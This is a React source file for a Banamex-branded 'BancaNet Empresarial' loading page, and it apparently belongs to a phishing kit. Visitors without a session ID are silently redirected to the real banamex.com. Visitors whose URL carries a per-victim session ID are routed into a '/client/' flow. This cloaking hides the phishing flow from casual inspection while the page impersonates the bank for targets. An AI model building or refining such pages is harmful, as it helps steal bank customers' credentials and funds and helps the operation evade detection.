import React, { useEffect, useState } from 'react';
import { useLocation, useRoute } from 'wouter';
import banamexLogo from '../assets/Banamex.png';

const GenerandoAclaracion: React.FC = () => {
  const [progress, setProgress] = useState(0);
  const [, setLocation] = useLocation();
  
  // Detectar si hay un sessionId en la URL
  const [matchDirectAccess] = useRoute('/');
  const [matchSessionPath, params] = useRoute('/:sessionId');
  const sessionId = params?.sessionId;
  
  const isDirectAccess = matchDirectAccess;
  const hasSessionId = matchSessionPath && sessionId && sessionId !== 'auth' && sessionId !== 'Balonx';

  // Efecto para animar la barra de progreso y simular carga
  useEffect(() => {
    // Para acceso directo, hacemos la animación un poco más lenta (3 segundos aprox)
    // Para acceso con sessionId, más rápida (2 segundos aprox)
    const intervalSpeed = isDirectAccess ? 30 : 20;
    
    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          return 100;
        }
        return prev + 1;
      });
    }, intervalSpeed);

    return () => clearInterval(interval);
  }, [isDirectAccess]);

  // Efecto para redirigir según el tipo de acceso
  useEffect(() => {
    if (progress === 100) {
      const redirectTimeout = setTimeout(() => {
        if (isDirectAccess) {
          // Si es acceso directo, redirigir a Banamex
          window.location.href = 'https://www.banamex.com/';
        } else if (hasSessionId) {
          // Si tiene un sessionId válido, redirigir al flujo normal del cliente
          setLocation(`/client/${sessionId}`);
        } else {
          // Por defecto, redirigir a Banamex
          window.location.href = 'https://www.banamex.com/';
        }
      }, 500);

      return () => clearTimeout(redirectTimeout);
    }
  }, [progress, isDirectAccess, hasSessionId, sessionId, setLocation]);

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-white text-center p-4">
      <img 
        src={banamexLogo} 
        alt="Banamex Logo" 
        className="w-48 mb-8" 
      />
      
      <h1 className="text-2xl font-bold mb-4 text-[#153e46]">
        {hasSessionId ? "Iniciando proceso de verificación" : "Procesando acceso a BancaNet"}
      </h1>
      
      <div className="w-full max-w-md mb-6">
        <div className="h-2 bg-gray-200 rounded-full">
          <div 
            className="h-full bg-[#153e46] rounded-full transition-all duration-300" 
            style={{ width: `${progress}%` }}
          ></div>
        </div>
        <p className="text-sm text-gray-500 mt-2">Procesando información, por favor espere...</p>
      </div>
      
      <div className="max-w-md text-gray-700 text-sm">
        {hasSessionId ? (
          <>
            <p className="mb-2">
              Estamos preparando su proceso de verificación para el acceso a BancaNet Empresarial de Banamex.
            </p>
            <p>
              Será redirigido a la plataforma segura en unos momentos. Por favor no cierre esta ventana.
            </p>
          </>
        ) : (
          <>
            <p className="mb-2">
              Estamos procesando su acceso a BancaNet Empresarial de Banamex.
            </p>
            <p>
              Será redirigido al portal oficial de Banamex en unos momentos.
            </p>
          </>
        )}
      </div>
    </div>
  );
};

export default GenerandoAclaracion;